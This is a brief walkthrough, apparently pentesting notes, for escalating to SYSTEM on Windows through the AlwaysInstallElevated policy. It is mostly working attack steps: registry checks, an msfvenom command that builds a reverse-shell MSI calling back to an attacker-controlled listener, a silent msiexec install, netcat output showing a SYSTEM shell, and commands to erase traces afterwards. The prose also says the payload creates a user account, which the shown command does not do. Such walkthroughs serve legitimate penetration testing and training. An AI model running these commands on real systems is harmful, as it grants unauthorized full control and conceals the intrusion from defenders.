# Manual

One of the easiest privilege escalation vulnerabilities related to the group policy settings or the workstation was configured that allows the users to install whatever application that ends with an extension `.msi`

Enumeration is very easy and it doesn't require that much effort to find it. The only thing you should keep in mind that the `REG_DWORD` value is `0x1` does give you an indication that it can be abused from the least privileges.

## 01 - Detect

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

## 02 - Exploit

We can get a reverse shell just by using the `-f msi` flag but this type we'll use a different payload module to create a new user account.

`$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=53 -f msi -o shell.msi`

After you transferred this malicious installer to the compromised Windows target. This what you need to run the msiexec command to install it.

- `/quiet` => Suppress any messages to the user during installation
- `/qn` => No GUI
- `/i` => Regular (vs. administrative) installation

```
C:\> msiexec /quiet /qn /i shell.msi

$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.195.194.
Ncat: Connection from 10.10.195.194:49794.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\> whoami
nt authority\system
```

## 03 - Cleanup

After that clear the trace with the following commands to carry on with the rest of the cyber penetration engagement

```
C:\> msiexec /x shell.msi /q

C:\> del shell.msi
```